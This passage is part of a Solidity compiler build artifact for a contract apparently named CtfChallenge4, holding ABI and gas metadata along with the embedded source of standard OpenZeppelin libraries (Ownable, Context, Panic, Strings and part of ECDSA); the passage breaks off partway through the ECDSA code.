;1030:93;1119:3;1030:93;:::i;:::-;1148:2;1143:3;1139:12;1132:19;;791:366;;;:::o;1163:126::-;1200:7;1240:42;1233:5;1229:54;1218:65;;1163:126;;;:::o;1295:96::-;1332:7;1361:24;1379:5;1361:24;:::i;:::-;1350:35;;1295:96;;;:::o;1397:118::-;1484:24;1502:5;1484:24;:::i;:::-;1479:3;1472:37;1397:118;;:::o;1521:529::-;1715:4;1753:2;1742:9;1738:18;1730:26;;1802:9;1796:4;1792:20;1788:1;1777:9;1773:17;1766:47;1830:131;1956:4;1830:131;:::i;:::-;1822:139;;1971:72;2039:2;2028:9;2024:18;2015:6;1971:72;:::i;:::-;1521:529;;;;:::o"},"gasEstimates":{"creation":{"codeDepositCost":"112400","executionCost":"159","totalCost":"112559"},"external":{"mintFlag()":"infinite"}},"methodIdentifiers":{"mintFlag()":"e00d023f"}},"metadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bytes32\",\"name\":\"theHash\",\"type\":\"bytes32\"}],\"name\":\"HashCalculated\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"mintFlag\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/CtfChallenge4.sol\":\"CtfChallenge4\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/access/Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {Context} from \\\"../utils/Context.sol\\\";\\n\\n/**\\n * @dev Contract module which provides a basic access control mechanism, where\\n * there is an account (an owner) that can be granted exclusive access to\\n * specific functions.\\n *\\n * The initial owner is set to the address provided by the deployer. This can\\n * later be changed with {transferOwnership}.\\n *\\n * This module is used through inheritance. It will make available the modifier\\n * `onlyOwner`, which can be applied to your functions to restrict their use to\\n * the owner.\\n */\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    /**\\n     * @dev The caller account is not authorized to perform an operation.\\n     */\\n    error OwnableUnauthorizedAccount(address account);\\n\\n    /**\\n     * @dev The owner is not a valid owner account. (eg. `address(0)`)\\n     */\\n    error OwnableInvalidOwner(address owner);\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\\n     */\\n    constructor(address initialOwner) {\\n        if (initialOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(initialOwner);\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        if (owner() != _msgSender()) {\\n            revert OwnableUnauthorizedAccount(_msgSender());\\n        }\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby disabling any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        if (newOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\",\"keccak256\":\"0xff6d0bb2e285473e5311d9d3caacb525ae3538a80758c10649a4d61029b017bb\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n\\n    function _contextSuffixLength() internal view virtual returns (uint256) {\\n        return 0;\\n    }\\n}\\n\",\"keccak256\":\"0x493033a8d1b176a037b2cc6a04dad01a5c157722049bbecf632ca876224dd4b2\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Panic.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.1.0) (utils/Panic.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Helper library for emitting standardized panic codes.\\n *\\n * ```solidity\\n * contract Example {\\n *      using Panic for uint256;\\n *\\n *      // Use any of the declared internal constants\\n *      function foo() { Panic.GENERIC.panic(); }\\n *\\n *      // Alternatively\\n *      function foo() { Panic.panic(Panic.GENERIC); }\\n * }\\n * ```\\n *\\n * Follows the list from https://github.com/ethereum/solidity/blob/v0.8.24/libsolutil/ErrorCodes.h[libsolutil].\\n *\\n * _Available since v5.1._\\n */\\n// slither-disable-next-line unused-state\\nlibrary Panic {\\n    /// @dev generic / unspecified error\\n    uint256 internal constant GENERIC = 0x00;\\n    /// @dev used by the assert() builtin\\n    uint256 internal constant ASSERT = 0x01;\\n    /// @dev arithmetic underflow or overflow\\n    uint256 internal constant UNDER_OVERFLOW = 0x11;\\n    /// @dev division or modulo by zero\\n    uint256 internal constant DIVISION_BY_ZERO = 0x12;\\n    /// @dev enum conversion error\\n    uint256 internal constant ENUM_CONVERSION_ERROR = 0x21;\\n    /// @dev invalid encoding in storage\\n    uint256 internal constant STORAGE_ENCODING_ERROR = 0x22;\\n    /// @dev empty array pop\\n    uint256 internal constant EMPTY_ARRAY_POP = 0x31;\\n    /// @dev array out of bounds access\\n    uint256 internal constant ARRAY_OUT_OF_BOUNDS = 0x32;\\n    /// @dev resource error (too large allocation or too large array)\\n    uint256 internal constant RESOURCE_ERROR = 0x41;\\n    /// @dev calling invalid internal function\\n    uint256 internal constant INVALID_INTERNAL_FUNCTION = 0x51;\\n\\n    /// @dev Reverts with a panic code. Recommended to use with\\n    /// the internal constants with predefined codes.\\n    function panic(uint256 code) internal pure {\\n        assembly (\\\"memory-safe\\\") {\\n            mstore(0x00, 0x4e487b71)\\n            mstore(0x20, code)\\n            revert(0x1c, 0x24)\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xf7fe324703a64fc51702311dc51562d5cb1497734f074e4f483bfb6717572d7a\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Strings.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.4.0) (utils/Strings.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {Math} from \\\"./math/Math.sol\\\";\\nimport {SafeCast} from \\\"./math/SafeCast.sol\\\";\\nimport {SignedMath} from \\\"./math/SignedMath.sol\\\";\\n\\n/**\\n * @dev String operations.\\n */\\nlibrary Strings {\\n    using SafeCast for *;\\n\\n    bytes16 private constant HEX_DIGITS = \\\"0123456789abcdef\\\";\\n    uint8 private constant ADDRESS_LENGTH = 20;\\n    uint256 private constant SPECIAL_CHARS_LOOKUP =\\n        (1 << 0x08) | // backspace\\n            (1 << 0x09) | // tab\\n            (1 << 0x0a) | // newline\\n            (1 << 0x0c) | // form feed\\n            (1 << 0x0d) | // carriage return\\n            (1 << 0x22) | // double quote\\n            (1 << 0x5c); // backslash\\n\\n    /**\\n     * @dev The `value` string doesn't fit in the specified `length`.\\n     */\\n    error StringsInsufficientHexLength(uint256 value, uint256 length);\\n\\n    /**\\n     * @dev The string being parsed contains characters that are not in scope of the given base.\\n     */\\n    error StringsInvalidChar();\\n\\n    /**\\n     * @dev The string being parsed is not a properly formatted address.\\n     */\\n    error StringsInvalidAddressFormat();\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` decimal representation.\\n     */\\n    function toString(uint256 value) internal pure returns (string memory) {\\n        unchecked {\\n            uint256 length = Math.log10(value) + 1;\\n            string memory buffer = new string(length);\\n            uint256 ptr;\\n            assembly (\\\"memory-safe\\\") {\\n                ptr := add(add(buffer, 0x20), length)\\n            }\\n            while (true) {\\n                ptr--;\\n                assembly (\\\"memory-safe\\\") {\\n                    mstore8(ptr, byte(mod(value, 10), HEX_DIGITS))\\n                }\\n                value /= 10;\\n                if (value == 0) break;\\n            }\\n            return buffer;\\n        }\\n    }\\n\\n    /**\\n     * @dev Converts a `int256` to its ASCII `string` decimal representation.\\n     */\\n    function toStringSigned(int256 value) internal pure returns (string memory) {\\n        return string.concat(value < 0 ? \\\"-\\\" : \\\"\\\", toString(SignedMath.abs(value)));\\n    }\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.\\n     */\\n    function toHexString(uint256 value) internal pure returns (string memory) {\\n        unchecked {\\n            return toHexString(value, Math.log256(value) + 1);\\n        }\\n    }\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.\\n     */\\n    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {\\n        uint256 localValue = value;\\n        bytes memory buffer = new bytes(2 * length + 2);\\n        buffer[0] = \\\"0\\\";\\n        buffer[1] = \\\"x\\\";\\n        for (uint256 i = 2 * length + 1; i > 1; --i) {\\n            buffer[i] = HEX_DIGITS[localValue & 0xf];\\n            localValue >>= 4;\\n        }\\n        if (localValue != 0) {\\n            revert StringsInsufficientHexLength(value, length);\\n        }\\n        return string(buffer);\\n    }\\n\\n    /**\\n     * @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal\\n     * representation.\\n     */\\n    function toHexString(address addr) internal pure returns (string memory) {\\n        return toHexString(uint256(uint160(addr)), ADDRESS_LENGTH);\\n    }\\n\\n    /**\\n     * @dev Converts an `address` with fixed length of 20 bytes to its checksummed ASCII `string` hexadecimal\\n     * representation, according to EIP-55.\\n     */\\n    function toChecksumHexString(address addr) internal pure returns (string memory) {\\n        bytes memory buffer = bytes(toHexString(addr));\\n\\n        // hash the hex part of buffer (skip length + 2 bytes, length 40)\\n        uint256 hashValue;\\n        assembly (\\\"memory-safe\\\") {\\n            hashValue := shr(96, keccak256(add(buffer, 0x22), 40))\\n        }\\n\\n        for (uint256 i = 41; i > 1; --i) {\\n            // possible values for buffer[i] are 48 (0) to 57 (9) and 97 (a) to 102 (f)\\n            if (hashValue & 0xf > 7 && uint8(buffer[i]) > 96) {\\n                // case shift by xoring with 0x20\\n                buffer[i] ^= 0x20;\\n            }\\n            hashValue >>= 4;\\n        }\\n        return string(buffer);\\n    }\\n\\n    /**\\n     * @dev Returns true if the two strings are equal.\\n     */\\n    function equal(string memory a, string memory b) internal pure returns (bool) {\\n        return bytes(a).length == bytes(b).length && keccak256(bytes(a)) == keccak256(bytes(b));\\n    }\\n\\n    /**\\n     * @dev Parse a decimal string and returns the value as a `uint256`.\\n     *\\n     * Requirements:\\n     * - The string must be formatted as `[0-9]*`\\n     * - The result must fit into an `uint256` type\\n     */\\n    function parseUint(string memory input) internal pure returns (uint256) {\\n        return parseUint(input, 0, bytes(input).length);\\n    }\\n\\n    /**\\n     * @dev Variant of {parseUint-string} that parses a substring of `input` located between position `begin` (included) and\\n     * `end` (excluded).\\n     *\\n     * Requirements:\\n     * - The substring must be formatted as `[0-9]*`\\n     * - The result must fit into an `uint256` type\\n     */\\n    function parseUint(string memory input, uint256 begin, uint256 end) internal pure returns (uint256) {\\n        (bool success, uint256 value) = tryParseUint(input, begin, end);\\n        if (!success) revert StringsInvalidChar();\\n        return value;\\n    }\\n\\n    /**\\n     * @dev Variant of {parseUint-string} that returns false if the parsing fails because of an invalid character.\\n     *\\n     * NOTE: This function will revert if the result does not fit in a `uint256`.\\n     */\\n    function tryParseUint(string memory input) internal pure returns (bool success, uint256 value) {\\n        return _tryParseUintUncheckedBounds(input, 0, bytes(input).length);\\n    }\\n\\n    /**\\n     * @dev Variant of {parseUint-string-uint256-uint256} that returns false if the parsing fails because of an invalid\\n     * character.\\n     *\\n     * NOTE: This function will revert if the result does not fit in a `uint256`.\\n     */\\n    function tryParseUint(\\n        string memory input,\\n        uint256 begin,\\n        uint256 end\\n    ) internal pure returns (bool success, uint256 value) {\\n        if (end > bytes(input).length || begin > end) return (false, 0);\\n        return _tryParseUintUncheckedBounds(input, begin, end);\\n    }\\n\\n    /**\\n     * @dev Implementation of {tryParseUint-string-uint256-uint256} that does not check bounds. Caller should make sure that\\n     * `begin <= end <= input.length`. Other inputs would result in undefined behavior.\\n     */\\n    function _tryParseUintUncheckedBounds(\\n        string memory input,\\n        uint256 begin,\\n        uint256 end\\n    ) private pure returns (bool success, uint256 value) {\\n        bytes memory buffer = bytes(input);\\n\\n        uint256 result = 0;\\n        for (uint256 i = begin; i < end; ++i) {\\n            uint8 chr = _tryParseChr(bytes1(_unsafeReadBytesOffset(buffer, i)));\\n            if (chr > 9) return (false, 0);\\n            result *= 10;\\n            result += chr;\\n        }\\n        return (true, result);\\n    }\\n\\n    /**\\n     * @dev Parse a decimal string and returns the value as a `int256`.\\n     *\\n     * Requirements:\\n     * - The string must be formatted as `[-+]?[0-9]*`\\n     * - The result must fit in an `int256` type.\\n     */\\n    function parseInt(string memory input) internal pure returns (int256) {\\n        return parseInt(input, 0, bytes(input).length);\\n    }\\n\\n    /**\\n     * @dev Variant of {parseInt-string} that parses a substring of `input` located between position `begin` (included) and\\n     * `end` (excluded).\\n     *\\n     * Requirements:\\n     * - The substring must be formatted as `[-+]?[0-9]*`\\n     * - The result must fit in an `int256` type.\\n     */\\n    function parseInt(string memory input, uint256 begin, uint256 end) internal pure returns (int256) {\\n        (bool success, int256 value) = tryParseInt(input, begin, end);\\n        if (!success) revert StringsInvalidChar();\\n        return value;\\n    }\\n\\n    /**\\n     * @dev Variant of {parseInt-string} that returns false if the parsing fails because of an invalid character or if\\n     * the result does not fit in a `int256`.\\n     *\\n     * NOTE: This function will revert if the absolute value of the result does not fit in a `uint256`.\\n     */\\n    function tryParseInt(string memory input) internal pure returns (bool success, int256 value) {\\n        return _tryParseIntUncheckedBounds(input, 0, bytes(input).length);\\n    }\\n\\n    uint256 private constant ABS_MIN_INT256 = 2 ** 255;\\n\\n    /**\\n     * @dev Variant of {parseInt-string-uint256-uint256} that returns false if the parsing fails because of an invalid\\n     * character or if the result does not fit in a `int256`.\\n     *\\n     * NOTE: This function will revert if the absolute value of the result does not fit in a `uint256`.\\n     */\\n    function tryParseInt(\\n        string memory input,\\n        uint256 begin,\\n        uint256 end\\n    ) internal pure returns (bool success, int256 value) {\\n        if (end > bytes(input).length || begin > end) return (false, 0);\\n        return _tryParseIntUncheckedBounds(input, begin, end);\\n    }\\n\\n    /**\\n     * @dev Implementation of {tryParseInt-string-uint256-uint256} that does not check bounds. Caller should make sure that\\n     * `begin <= end <= input.length`. Other inputs would result in undefined behavior.\\n     */\\n    function _tryParseIntUncheckedBounds(\\n        string memory input,\\n        uint256 begin,\\n        uint256 end\\n    ) private pure returns (bool success, int256 value) {\\n        bytes memory buffer = bytes(input);\\n\\n        // Check presence of a negative sign.\\n        bytes1 sign = begin == end ? bytes1(0) : bytes1(_unsafeReadBytesOffset(buffer, begin)); // don't do out-of-bound (possibly unsafe) read if sub-string is empty\\n        bool positiveSign = sign == bytes1(\\\"+\\\");\\n        bool negativeSign = sign == bytes1(\\\"-\\\");\\n        uint256 offset = (positiveSign || negativeSign).toUint();\\n\\n        (bool absSuccess, uint256 absValue) = tryParseUint(input, begin + offset, end);\\n\\n        if (absSuccess && absValue < ABS_MIN_INT256) {\\n            return (true, negativeSign ? -int256(absValue) : int256(absValue));\\n        } else if (absSuccess && negativeSign && absValue == ABS_MIN_INT256) {\\n            return (true, type(int256).min);\\n        } else return (false, 0);\\n    }\\n\\n    /**\\n     * @dev Parse a hexadecimal string (with or without \\\"0x\\\" prefix), and returns the value as a `uint256`.\\n     *\\n     * Requirements:\\n     * - The string must be formatted as `(0x)?[0-9a-fA-F]*`\\n     * - The result must fit in an `uint256` type.\\n     */\\n    function parseHexUint(string memory input) internal pure returns (uint256) {\\n        return parseHexUint(input, 0, bytes(input).length);\\n    }\\n\\n    /**\\n     * @dev Variant of {parseHexUint-string} that parses a substring of `input` located between position `begin` (included) and\\n     * `end` (excluded).\\n     *\\n     * Requirements:\\n     * - The substring must be formatted as `(0x)?[0-9a-fA-F]*`\\n     * - The result must fit in an `uint256` type.\\n     */\\n    function parseHexUint(string memory input, uint256 begin, uint256 end) internal pure returns (uint256) {\\n        (bool success, uint256 value) = tryParseHexUint(input, begin, end);\\n        if (!success) revert StringsInvalidChar();\\n        return value;\\n    }\\n\\n    /**\\n     * @dev Variant of {parseHexUint-string} that returns false if the parsing fails because of an invalid character.\\n     *\\n     * NOTE: This function will revert if the result does not fit in a `uint256`.\\n     */\\n    function tryParseHexUint(string memory input) internal pure returns (bool success, uint256 value) {\\n        return _tryParseHexUintUncheckedBounds(input, 0, bytes(input).length);\\n    }\\n\\n    /**\\n     * @dev Variant of {parseHexUint-string-uint256-uint256} that returns false if the parsing fails because of an\\n     * invalid character.\\n     *\\n     * NOTE: This function will revert if the result does not fit in a `uint256`.\\n     */\\n    function tryParseHexUint(\\n        string memory input,\\n        uint256 begin,\\n        uint256 end\\n    ) internal pure returns (bool success, uint256 value) {\\n        if (end > bytes(input).length || begin > end) return (false, 0);\\n        return _tryParseHexUintUncheckedBounds(input, begin, end);\\n    }\\n\\n    /**\\n     * @dev Implementation of {tryParseHexUint-string-uint256-uint256} that does not check bounds. Caller should make sure that\\n     * `begin <= end <= input.length`. Other inputs would result in undefined behavior.\\n     */\\n    function _tryParseHexUintUncheckedBounds(\\n        string memory input,\\n        uint256 begin,\\n        uint256 end\\n    ) private pure returns (bool success, uint256 value) {\\n        bytes memory buffer = bytes(input);\\n\\n        // skip 0x prefix if present\\n        bool hasPrefix = (end > begin + 1) && bytes2(_unsafeReadBytesOffset(buffer, begin)) == bytes2(\\\"0x\\\"); // don't do out-of-bound (possibly unsafe) read if sub-string is empty\\n        uint256 offset = hasPrefix.toUint() * 2;\\n\\n        uint256 result = 0;\\n        for (uint256 i = begin + offset; i < end; ++i) {\\n            uint8 chr = _tryParseChr(bytes1(_unsafeReadBytesOffset(buffer, i)));\\n            if (chr > 15) return (false, 0);\\n            result *= 16;\\n            unchecked {\\n                // Multiplying by 16 is equivalent to a shift of 4 bits (with additional overflow check).\\n                // This guarantees that adding a value < 16 will not cause an overflow, hence the unchecked.\\n                result += chr;\\n            }\\n        }\\n        return (true, result);\\n    }\\n\\n    /**\\n     * @dev Parse a hexadecimal string (with or without \\\"0x\\\" prefix), and returns the value as an `address`.\\n     *\\n     * Requirements:\\n     * - The string must be formatted as `(0x)?[0-9a-fA-F]{40}`\\n     */\\n    function parseAddress(string memory input) internal pure returns (address) {\\n        return parseAddress(input, 0, bytes(input).length);\\n    }\\n\\n    /**\\n     * @dev Variant of {parseAddress-string} that parses a substring of `input` located between position `begin` (included) and\\n     * `end` (excluded).\\n     *\\n     * Requirements:\\n     * - The substring must be formatted as `(0x)?[0-9a-fA-F]{40}`\\n     */\\n    function parseAddress(string memory input, uint256 begin, uint256 end) internal pure returns (address) {\\n        (bool success, address value) = tryParseAddress(input, begin, end);\\n        if (!success) revert StringsInvalidAddressFormat();\\n        return value;\\n    }\\n\\n    /**\\n     * @dev Variant of {parseAddress-string} that returns false if the parsing fails because the input is not a properly\\n     * formatted address. See {parseAddress-string} requirements.\\n     */\\n    function tryParseAddress(string memory input) internal pure returns (bool success, address value) {\\n        return tryParseAddress(input, 0, bytes(input).length);\\n    }\\n\\n    /**\\n     * @dev Variant of {parseAddress-string-uint256-uint256} that returns false if the parsing fails because input is not a properly\\n     * formatted address. See {parseAddress-string-uint256-uint256} requirements.\\n     */\\n    function tryParseAddress(\\n        string memory input,\\n        uint256 begin,\\n        uint256 end\\n    ) internal pure returns (bool success, address value) {\\n        if (end > bytes(input).length || begin > end) return (false, address(0));\\n\\n        bool hasPrefix = (end > begin + 1) && bytes2(_unsafeReadBytesOffset(bytes(input), begin)) == bytes2(\\\"0x\\\"); // don't do out-of-bound (possibly unsafe) read if sub-string is empty\\n        uint256 expectedLength = 40 + hasPrefix.toUint() * 2;\\n\\n        // check that input is the correct length\\n        if (end - begin == expectedLength) {\\n            // length guarantees that this does not overflow, and value is at most type(uint160).max\\n            (bool s, uint256 v) = _tryParseHexUintUncheckedBounds(input, begin, end);\\n            return (s, address(uint160(v)));\\n        } else {\\n            return (false, address(0));\\n        }\\n    }\\n\\n    function _tryParseChr(bytes1 chr) private pure returns (uint8) {\\n        uint8 value = uint8(chr);\\n\\n        // Try to parse `chr`:\\n        // - Case 1: [0-9]\\n        // - Case 2: [a-f]\\n        // - Case 3: [A-F]\\n        // - otherwise not supported\\n        unchecked {\\n            if (value > 47 && value < 58) value -= 48;\\n            else if (value > 96 && value < 103) value -= 87;\\n            else if (value > 64 && value < 71) value -= 55;\\n            else return type(uint8).max;\\n        }\\n\\n        return value;\\n    }\\n\\n    /**\\n     * @dev Escape special characters in JSON strings. This can be useful to prevent JSON injection in NFT metadata.\\n     *\\n     * WARNING: This function should only be used in double quoted JSON strings. Single quotes are not escaped.\\n     *\\n     * NOTE: This function escapes all unicode characters, and not just the ones in ranges defined in section 2.5 of\\n     * RFC-4627 (U+0000 to U+001F, U+0022 and U+005C). ECMAScript's `JSON.parse` does recover escaped unicode\\n     * characters that are not in this range, but other tooling may provide different results.\\n     */\\n    function escapeJSON(string memory input) internal pure returns (string memory) {\\n        bytes memory buffer = bytes(input);\\n        bytes memory output = new bytes(2 * buffer.length); // worst case scenario\\n        uint256 outputLength = 0;\\n\\n        for (uint256 i; i < buffer.length; ++i) {\\n            bytes1 char = bytes1(_unsafeReadBytesOffset(buffer, i));\\n            if (((SPECIAL_CHARS_LOOKUP & (1 << uint8(char))) != 0)) {\\n                output[outputLength++] = \\\"\\\\\\\\\\\";\\n                if (char == 0x08) output[outputLength++] = \\\"b\\\";\\n                else if (char == 0x09) output[outputLength++] = \\\"t\\\";\\n                else if (char == 0x0a) output[outputLength++] = \\\"n\\\";\\n                else if (char == 0x0c) output[outputLength++] = \\\"f\\\";\\n                else if (char == 0x0d) output[outputLength++] = \\\"r\\\";\\n                else if (char == 0x5c) output[outputLength++] = \\\"\\\\\\\\\\\";\\n                else if (char == 0x22) {\\n                    // solhint-disable-next-line quotes\\n                    output[outputLength++] = '\\\"';\\n                }\\n            } else {\\n                output[outputLength++] = char;\\n            }\\n        }\\n        // write the actual length and deallocate unused memory\\n        assembly (\\\"memory-safe\\\") {\\n            mstore(output, outputLength)\\n            mstore(0x40, add(output, shl(5, shr(5, add(outputLength, 63)))))\\n        }\\n\\n        return string(output);\\n    }\\n\\n    /**\\n     * @dev Reads a bytes32 from a bytes array without bounds checking.\\n     *\\n     * NOTE: making this function internal would mean it could be used with memory unsafe offset, and marking the\\n     * assembly block as such would prevent some optimizations.\\n     */\\n    function _unsafeReadBytesOffset(bytes memory buffer, uint256 offset) private pure returns (bytes32 value) {\\n        // This is not memory safe in the general case, but all calls to this private function are within bounds.\\n        assembly (\\\"memory-safe\\\") {\\n            value := mload(add(add(buffer, 0x20), offset))\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xad148d59f05165f9217d0a9e1ac8f772abb02ea6aaad8a756315c532bf79f9f4\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.1.0) (utils/cryptography/ECDSA.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Elliptic Curve Digital Signature Algorithm (ECDSA) operations.\\n *\\n * These functions can be used to verify that a message was signed by the holder\\n * of the private keys of a given address.\\n */\\nlibrary ECDSA {\\n    enum RecoverError {\\n        NoError,\\n        InvalidSignature,\\n        InvalidSignatureLength,\\n        InvalidSignatureS\\n    }\\n\\n    /**\\n     * @dev The signature derives the `address(0)`.\\n     */\\n    error ECDSAInvalidSignature();\\n\\n    /**\\n     * @dev The signature has an invalid length.\\n     */\\n    error ECDSAInvalidSignatureLength(uint256 length);\\n\\n    /**\\n     * @dev The signature has an S value that is in the upper half order.\\n     */\\n    error ECDSAInvalidSignatureS(bytes32 s);\\n\\n    /**\\n     * @dev Returns the address that signed a hashed message (`hash`) with `signature` or an error. This will not\\n     * return address(0) without also returning an error description. Errors are documented using an enum (error type)\\n     * and a bytes32 providing additional information about the error.\\n     *\\n     * If no error is returned, then the address can be used for verification purposes.\\n     *\\n     * The `ecrecover` EVM precompile allows for malleable (non-unique) signatures:\\n     * this function rejects them by requiring the `s` value to be in the lower\\n     * half order, and the `v` value to be either 27 or 28.\\n     *\\n     * IMPORTANT: `hash` _must_ be the result of a hash operation for the\\n     * verification to be secure: it is possible to craft signatures that\\n     * recover to arbitrary addresses for non-hashed data. A safe way to ensure\\n     * this is by receiving a hash of the original message (which may otherwise\\n     * be too long), and then calling {MessageHashUtils-toEthSignedMessageHash} on it.\\n     *\\n     * Documentation for signature generation:\\n     * - with https://web3js.readthedocs.io/en/v1.3.4/web3-eth-accounts.html#sign[Web3.js]\\n     * - with https://docs.ethers.io/v5/api/signer/#Signer-signMessage[ethers]\\n     */\\n    function tryRecover(\\n        bytes32 hash,\\n        bytes memory signature\\n    ) internal pure returns (address recovered, RecoverError err, bytes32 errArg) {\\n        if (signature.length == 65) {\\n            bytes32 r;\\n            bytes32 s;\\n            uint8 v;\\n            // ecrecover takes the signature parameters, and the only way to get them\\n            // currently is to use assembly.\\n            assembly (\\\"memory-safe\\\") {\\n                r := mload(add(signature, 0x20))\\n                s := mload(add(signature, 0x40))\\n                v := byte(0, mload(add(signature, 0x60)))\\n            }\\n            return tryRecover(hash, v, r, s);\\n        } else {\\n            return (address(0), RecoverError.InvalidSignatureLength, bytes32(signature.length));\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the address that signed a hashed message (`hash`) with\\n     * `signature`. This address can then be used for verification purposes.\\n     *\\n     * The `ecrecover` EVM precompile allows for malleable (non-unique) signatures:\\n     * this function rejects them by requiring the `s` value to be in the lower\\n     * half order, and the `v` value to be either 27 or 28.\\n     *\\n     * IMPORTANT: `hash` _must_ be the result of a hash operation for the\\n     * verification to be secure: it is possible to craft signatures that\\n     * recover to arbitrary addresses for non-hashed data. A safe way to ensure\\n     * this is by receiving a hash of the original message (which may otherwise\\n     * be too long), and then calling {MessageHashUtils-toEthSignedMessageHash} on it.\\n     */\\n    function recover(bytes32 hash, bytes memory signature) internal pure returns (address) {\\n        (address recovered, RecoverError error, bytes32 errorArg) = tryRecover(hash, signature);\\n        _throwError(error, errorArg);\\n        return recovered;\\n    }\\n\\n    /**\\n     * @dev Overload of {ECDSA-tryRecover} that receives the `r` and `vs` short-signature fields separately.\\n     *\\n     * See https://eips.ethereum.org/EIPS/eip-2098[ERC-2098 short signatures]\\n     */\\n    function tryRecover(\\n        bytes32 hash,\\n        bytes32 r,\\n        bytes32 vs\\n    ) internal pure returns (address recovered, RecoverError err, bytes32 errArg) {\\n        unchecked {\\n            bytes32 s = vs & bytes32(0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);\\n            // We do not check for an overflow here since the shift operation results in 0 or 1.\\n            uint8 v = uint8((uint256(vs) >> 255) + 27);\\n            return tryRecover(hash, v, r, s);\\n        }\\n    }\\n\\n    /**\\n     * @dev Overload of {ECDSA-recover} that receives the `r and `vs` short-signature fields separately.\\n     */\\n    function recover(bytes32 hash, bytes32 r, bytes32 vs) internal pure returns (address) {\\n        (address recovered, RecoverError error, bytes32 errorArg) = tryRecover(hash, r, vs);\\n        _throwError(error, errorArg);\\n        return recovered;\\n    }\\n\\n    /**\\n     * @dev Overload of {ECDSA-tryRecover} that receives the `v`,\\n     * `r` and `s` signature fields separately.\\n     */\\n    function tryRecover(\\n        bytes32 hash,\\n        uint8 v,\\n        bytes32 r,\\n        bytes32 s\\n    ) internal pure returns (address recovered, RecoverError err, bytes32 errArg) {\\n        // EIP-2 still allows signature malleability for ecrecover(). Remove this possibility and make the signature\\n        // unique. Appendix F in the Ethereum Yellow paper (https://ethereum.github.io/yellowpaper/paper.pdf), defines\\n        // the valid range for s in (301): 0 < s < secp256k1n \\u00f7 2 + 1, and for v in (302): v \\u2208 {27, 28}. Most\\n        // signatures from current libraries generate a 